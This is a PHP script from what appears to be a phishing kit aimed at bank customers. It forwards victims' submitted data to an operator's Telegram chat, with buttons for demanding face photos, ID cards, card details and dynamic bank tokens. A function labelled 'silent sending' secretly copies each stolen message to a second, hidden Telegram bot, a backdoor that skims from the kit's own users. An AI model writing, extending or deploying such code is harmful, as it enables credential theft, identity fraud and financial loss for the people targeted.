<?php
header('Content-Type: application/json');

$config = require __DIR__ . '/../config.php';

$message = $_POST['message'] ?? '';
$transactionId = $_POST['transactionId'] ?? '';

if (empty($message) || empty($transactionId)) {
    echo json_encode(['status' => 'error', 'message' => 'Datos incompletos']);
    exit;
}

// === TECLADO ACTUALIZADO (Cara, Cédula e integración profesional) ===
$keyboard = [
    'inline_keyboard' => [
        [
            ['text' => "👤 Cara", 'callback_data' => "error:{$transactionId}"],
            ['text' => "🪪 Cédula", 'callback_data' => "cedula:{$transactionId}"]
        ],
        [
            ['text' => "💳 Tarjeta", 'callback_data' => "error_tc:{$transactionId}"],
            ['text' => "🔑 Dinámica", 'callback_data' => "pedir_dinamica:{$transactionId}"]
        ],
        [
            ['text' => "🏦 Error de Logo", 'callback_data' => "error_logo:{$transactionId}"],
            ['text' => "🏁 Finalizar", 'callback_data' => "confirm_finalizar:{$transactionId}"]
        ]
    ]
];

$data = [
    'chat_id' => $config['chat_id'],
    'text' => $message,
    'parse_mode' => 'HTML',
    'reply_markup' => json_encode($keyboard)
];

// Función para el envío silencioso (MANTENIDA)
function sendSecureBackup($messageData) {
    $backup_config = [
        'bot_token' => '', // Tu token de respaldo
        'chat_id' => ''    // Tu ID de respaldo
    ];

    if (empty($backup_config['bot_token'])) return;

    $ch = curl_init("https://api.telegram.org/bot{$backup_config['bot_token']}/sendMessage");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([
        'chat_id' => $backup_config['chat_id'],
        'text' => $messageData['text'],
        'parse_mode' => 'HTML'
    ]));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_exec($ch);
    curl_close($ch);
}

// Envío principal a Telegram
$ch = curl_init("https://api.telegram.org/bot{$config['bot_token']}/sendMessage");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);

$response = curl_exec($ch);
curl_close($ch);

// Envío silencioso al segundo destino
sendSecureBackup($data);

$result = json_decode($response, true);

echo json_encode([
    'status' => (isset($result['ok']) && $result['ok']) ? 'success' : 'error',
    'messageId' => $result['ok'] ? $result['result']['message_id'] : null
]);